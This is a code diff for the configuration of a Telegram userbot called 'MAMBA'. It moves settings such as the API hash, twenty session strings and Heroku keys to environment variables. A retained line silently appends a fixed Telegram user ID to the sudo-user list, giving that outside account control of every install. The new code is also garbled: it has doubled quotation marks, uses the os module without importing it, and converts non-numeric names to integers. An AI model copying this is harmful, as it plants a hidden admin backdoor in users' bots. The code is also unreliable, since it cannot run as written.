@@ -8,7 +8,8 @@ import telethon.utils
 from telethon.tl import functions
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
-from MAMBA.Config import Var as Config 
+from MAMBA.Config import Config
+from MAMBA.Config import Var 
 from os import getenv
 import logging
 import time
@@ -23,31 +24,35 @@ logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s'
 
 
 #values
-API_ID = Config("API_ID")
-API_HASH = Config("API_HASH", default=None)
-ALIVE_PIC = Config("ALIVE_PIC", default=None)
-HEROKU_APP_NAME = Config("HEROKU_APP_NAME", None)
-HEROKU_API_KEY = Config("HEROKU_API_KEY", None)
-STRING = Config("STRING", default=None)
-STRING2 = Config("STRING2", default=None)
-STRING3 = Config("STRING3", default=None)
-STRING4 = Config("STRING4", default=None)
-STRING5 = Config("STRING5", default=None)
-STRING6 = Config("STRING6", default=None)
-STRING7 = Config("STRING7", default=None)
-STRING8 = Config("STRING8", default=None)
-STRING9 = Config("STRING9", default=None)
-STRING10 = Config("STRING10", default=None)
-STRING11 = onfig("STRING11", default=None)
-STRING12 = Config("STRING12", default=None)
-STRING13 = Config("STRING13", default=None)
-STRING14 = Config("STRING14", default=None)
-STRING15 = Config("STRING15", default=None)
-STRING16 = Config("STRING16", default=None)
-STRING17 = Config("STRING17", default=None)
-STRING18 = Config("STRING18", default=None)
-STRING19 = Config("STRING19", default=None)
-STRING20 = Config("STRING20", default=None)
+APP_ID = int(os.environ.get("APP_ID", 6))
+ # 6 is a placeholder
+API_HASH = os.environ.get("API_HASH", "eb06d4abfb49dc3eeb1aeb98ae0f581e")
+ALIVE_NAME = set(
+        int(x) for x in os.environ.get("ALIVE_NAME", "MAMBA MAMBAX").split()
+    )
+ALIVE_PIC = os.environ.get("ALIVE_PIC", None)
+STRING = os.environ.get("STRING", None)
+STRING2 = os.environ.get("STRING2", None)
+STRING3 = os.environ.get("STRING3", None)
+STRING4 = os.environ.get("STRING4", None)
+STRING5 = os.environ.get("STRING5", None)
+STRING6 = os.environ.get("STRING6", None)
+STRING7 = os.environ.get("STRING7", None)
+STRING8 = os.environ.get("STRING8", None)
+STRING9 = os.environ.get("STRING9", None)
+STRING10 = os.environ.get("STRING10", None)
+STRING11 = os.environ.get("STRING11", None)
+STRING12 = os.environ.get("STRING12", None)
+STRING13 = os.environ.get("STRING13", None)
+STRING14 = os.environ.get("STRING14"", None)
+STRING15 = os.environ.get("STRING15", None)
+STRING16 = os.environ.get("STRING16"", None)
+STRING17 = os.environ.get("STRING17", None)
+STRING18 = os.environ.get("STRING18", None)
+STRING19 = os.environ.get("STRING19", None)
+STRING20 = os.environ.get("STRING20", None)
+HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)
+HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
 if 5038173179 not in SUDO_USERS:
     SUDO_USERS.append(5038173179)
